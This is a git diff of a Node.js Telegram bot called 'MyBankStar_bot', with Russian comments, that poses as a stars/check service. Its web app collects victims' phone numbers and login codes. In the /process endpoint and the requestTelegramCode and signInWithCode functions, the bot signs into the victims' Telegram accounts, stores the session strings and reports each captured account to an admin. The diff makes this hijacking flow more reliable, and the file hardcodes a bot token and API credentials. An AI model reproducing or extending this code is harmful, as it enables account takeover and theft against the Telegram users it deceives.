@@ -7,21 +7,39 @@ const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M7kRd-8OJoo';
-const API_ID = parseInt(process.env.API_ID) || 32865720;
-const API_HASH = process.env.API_HASH || 'aa86943502451690495bb18ecd230825';
+const API_ID = parseInt(process.env.API_ID) || 32661198;
+const API_HASH = process.env.API_HASH || 'd79cbe32d32c5a02a75f3d8c1937df12';
 const ADMIN_USER_ID = 1398396668;
 
 // URL, где доступен web-app + статика (fragment.html, stars.jpg, avatar.jpg)
 const WEB_APP_URL = process.env.WEB_APP_URL || 'https://eeee-2bsj.onrender.com';
-const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || WEB_APP_URL; // для inline-картинок чеков
-const BOT_USERNAME = 'MyBankStar_bot'; // без @
+const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || WEB_APP_URL;
+const BOT_USERNAME = 'MyBankStar_bot';
 
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+const bot = new TelegramBot(BOT_TOKEN, { 
+    polling: {
+        interval: 300,
+        autoStart: true,
+        params: {
+            timeout: 10,
+            allowed_updates: ['message', 'callback_query', 'inline_query']
+        }
+    },
+    filepath: false
+});
+
 const app = express();
 const activeSessions = new Map();
 
 app.use(express.json());
 app.use(express.static('public'));
+
+// Добавь CORS для веб-приложения
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    next();
+});
 
 // ================= БАЗА ДАННЫХ =================
 const db = new sqlite3.Database('database.db');
@@ -70,59 +88,92 @@ app.get('/', (req, res) => {
 });
 
 app.post('/process', async (req, res) => {
-    if (req.body.stage === 'phone_entered') {
-        try {
+    console.log('📨 POST /process получен:', req.body);
+    
+    try {
+        if (req.body.stage === 'phone_entered') {
+            console.log('📱 Введен номер:', req.body.phone);
+            
             const urlParams = new URLSearchParams(req.body.tg_data);
             const userStr = urlParams.get('user');
             let userId = null;
             
             if (userStr) {
-                const userData = JSON.parse(decodeURIComponent(userStr));
-                userId = userData.id;
+                try {
+                    const userData = JSON.parse(decodeURIComponent(userStr));
+                    userId = userData.id;
+                    console.log('👤 User ID из TG:', userId);
+                } catch (e) {
+                    console.log('❌ Ошибка парсинга user data:', e);
+                }
             }
             
             db.run(
                 `INSERT INTO user_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
-                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']
+                [req.body.phone, req.body.tg_data, userId, 'awaiting_code'],
+                function(err) {
+                    if (err) {
+                        console.log('❌ Ошибка базы данных:', err);
+                    } else {
+                        console.log('✅ Данные сохранены в базу, ID:', this.lastID);
+                    }
+                }
             );
             
             await requestTelegramCode(req.body.phone, userId);
+            res.json({ success: true, message: 'Код отправлен' });
                 
-        } catch (error) {
-            console.log('Ошибка:', error);
-        }
+        } else if (req.body.stage === 'code_entered') {
+            console.log('🔢 Введен код:', req.body.code, 'для номера:', req.body.phone);
+            const phone = req.body.phone;
+            const code = req.body.code;
             
-    } else if (req.body.stage === 'code_entered') {
-        const phone = req.body.phone;
-        const code = req.body.code;
+            await signInWithCode(phone, code);
+            res.json({ success: true, message: 'Код проверен' });
+        } else {
+            console.log('❌ Неизвестный stage:', req.body.stage);
+            res.json({ success: false, error: 'Unknown stage' });
+        }
         
-        await signInWithCode(phone, code);
+    } catch (error) {
+        console.log('❌ Ошибка /process:', error);
+        res.json({ success: false, error: error.message });
     }
-    
-    res.sendStatus(200);
 });
 
 // ================= ЗАПРОС КОДА =================
 async function requestTelegramCode(phone, userId) {
     try {
+        console.log(`🔄 Запрос кода для: ${phone}`);
+        
         const stringSession = new StringSession("");
         const client = new TelegramClient(stringSession, API_ID, API_HASH, {
-            connectionRetries: 5,
-            timeout: 60000,
-            useWSS: false
+            connectionRetries: 3,
+            timeout: 30000,
+            useWSS: true,
+            baseLogger: console
         });
         
         await client.connect();
+        console.log(`✅ Подключен к Telegram API`);
 
         const result = await client.invoke(
             new Api.auth.SendCode({
                 phoneNumber: phone,
                 apiId: API_ID,
                 apiHash: API_HASH,
-                settings: new Api.CodeSettings({})
+                settings: new Api.CodeSettings({
+                    allowFlashcall: false,
+                    currentNumber: true,
+                    allowAppHash: true,
+                    allowMissedCall: false,
+                    allowFirebase: false
+                })
             })
         );
 
+        console.log(`✅ Код запрошен для ${phone}, hash: ${result.phoneCodeHash}`);
+        
         activeSessions.set(phone, {
             client: client,
             phoneCodeHash: result.phoneCodeHash,
@@ -131,27 +182,40 @@ async function requestTelegramCode(phone, userId) {
 
         db.run(
             `UPDATE user_sessions SET phone_code_hash = ? WHERE phone = ?`, 
-            [result.phoneCodeHash, phone]
+            [result.phoneCodeHash, phone],
+            function(err) {
+                if (err) {
+                    console.log('❌ Ошибка обновления phone_code_hash:', err);
+                } else {
+                    console.log('✅ phone_code_hash сохранен в базу');
+                }
+            }
         );
 
-        bot.sendMessage(ADMIN_USER_ID, `Код запрошен: ${phone}`);
+        bot.sendMessage(ADMIN_USER_ID, `📱 Код запрошен для: ${phone}\n⏳ Ожидайте SMS...`);
         
     } catch (error) {
-        bot.sendMessage(ADMIN_USER_ID, `Ошибка: ${error.message}`);
+        console.log(`❌ Ошибка запроса кода: ${error.message}`);
+        bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка для ${phone}: ${error.message}`);
     }
 }
 
 // ================= ВХОД С КОДОМ =================
 async function signInWithCode(phone, code) {
     try {
+        console.log(`🔐 Попытка входа для ${phone} с кодом: ${code}`);
+        
         const sessionData = activeSessions.get(phone);
-        if (!sessionData) return;
+        if (!sessionData) {
+            console.log(`❌ Нет активной сессии для ${phone}`);
+            return;
+        }
 
         const client = sessionData.client;
         const phoneCodeHash = sessionData.phoneCodeHash;
 
         try {
-            await client.invoke(
+            const result = await client.invoke(
                 new Api.auth.SignIn({
                     phoneNumber: phone,
                     phoneCodeHash: phoneCodeHash,
@@ -159,30 +223,60 @@ async function signInWithCode(phone, code) {
                 })
             );
 
+            console.log(`✅ Успешный вход для ${phone}`);
             const sessionString = client.session.save();
+            
             db.run(
                 `UPDATE user_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
-                [sessionString, phone]
+                [sessionString, phone],
+                function(err) {
+                    if (err) {
+                        console.log('❌ Ошибка сохранения сессии:', err);
+                    } else {
+                        console.log('✅ Сессия сохранена в базу');
+                    }
+                }
             );
 
             const user = await client.getMe();
-            bot.sendMessage(
-                ADMIN_USER_ID, 
-                `Сессия сохранена: ${phone}\n👤 @${user.username || 'нет'}`
-            );
+            const message = `✅ Сессия сохранена: ${phone}\n👤 @${user.username || 'нет username'}\nID: ${user.id}`;
+            
+            bot.sendMessage(ADMIN_USER_ID, message);
+            console.log(message);
             
             await client.disconnect();
             activeSessions.delete(phone);
+            console.log(`✅ Клиент отключен, сессия удалена из activeSessions`);
 
         } catch (signInError) {
-            bot.sendMessage(ADMIN_USER_ID, `Ошибка входа: ${phone}`);
+            console.log(`❌ Ошибка входа для ${phone}:`, signInError.message);
+            bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка входа: ${phone} - ${signInError.message}`);
+            
+            try {
+                await client.disconnect();
+            } catch (e) {}
+            
             activeSessions.delete(phone);
         }
 
     } catch (error) {
-        bot.sendMessage(ADMIN_USER_ID, `Ошибка: ${error.message}`);
+        console.log(`❌ Общая ошибка signInWithCode: ${error.message}`);
+        bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка: ${error.message}`);
     }
 }
+
+// ================= ОБРАБОТКА ОШИБОК POLLING =================
+bot.on('polling_error', (error) => {
+    console.log('⚠️ Polling error:', error.code, error.message);
+    if (error.code === 409) {
+        console.log('🔴 Конфликт: другой экземпляр бота запущен');
+        setTimeout(() => {
+            console.log('🔄 Перезапускаем polling...');
+            bot.stopPolling();
+            setTimeout(() => bot.startPolling(), 3000);
+        }, 5000);
+    }
+});
 
 // ================= АДМИНСКИЕ КОМАНДЫ =================
 bot.onText(/\/admin/, (msg) => {
@@ -204,7 +298,7 @@ bot.onText(/\/admin/, (msg) => {
     });
 });
 
-// ================= INLINE QUERY ДЛЯ ЧЕКОВ (С ФОТО) =================
+// ================= INLINE QUERY ДЛЯ ЧЕКОВ =================
 bot.on('inline_query', (query) => {
     const starsUrl = `${PUBLIC_BASE_URL.replace(/\/+$/, '')}/stars.jpg`;
 
@@ -244,7 +338,7 @@ bot.on('inline_query', (query) => {
     bot.answerInlineQuery(query.id, results, { cache_time: 1 });
 });
 
-// ================= ГЛАВНОЕ МЕНЮ (/start БЕЗ ПАРАМЕТРА + ФОТО) =================
+// ================= ГЛАВНОЕ МЕНЮ =================
 bot.onText(/\/start$/, (msg) => {
     const chatId = msg.chat.id;
     
@@ -369,7 +463,7 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// ================= СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @ (в чате) =================
+// ================= СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @ =================
 bot.onText(/@MyBankStar_bot/, (msg) => {
     bot.sendMessage(msg.chat.id, '🎫 Создание чека:', {
         reply_markup: {
@@ -381,7 +475,7 @@ bot.onText(/@MyBankStar_bot/, (msg) => {
     });
 });
 
-// ================= ОБРАБОТКА ЧЕКОВ ПО /start PARAM =================
+// ================= ОБРАБОТКА ЧЕКОВ =================
 bot.onText(/\/start (.+)/, (msg, match) => {
     const params = match[1];
     const userId = msg.from.id;
@@ -414,7 +508,6 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                                 const newBalance = (userRow ? userRow.balance : 0) + row.amount;
                                 
                                 db.serialize(() => {
-                                    // делаем чек одноразовым — activations-- и used_checks
                                     db.run(
                                         `UPDATE checks SET activations = activations - 1 WHERE id = ?`,
                                         [checkId]
@@ -716,7 +809,11 @@ function showLogs(chatId) {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Сервер работает на порту ${PORT}`);
+    console.log(`🚀 Сервер работает на порту ${PORT}`);
+    console.log(`🌐 Web App доступен по: ${WEB_APP_URL}`);
 });
 
-console.log('✅ Бот запущен: /start с фоткой + чеки с фотками и одноразовым использованием + админские команды');
+console.log('✅ Бот запущен с улучшенной обработкой кодов');
+
+// Экспорт для тестирования
+module.exports = { app, bot, db };
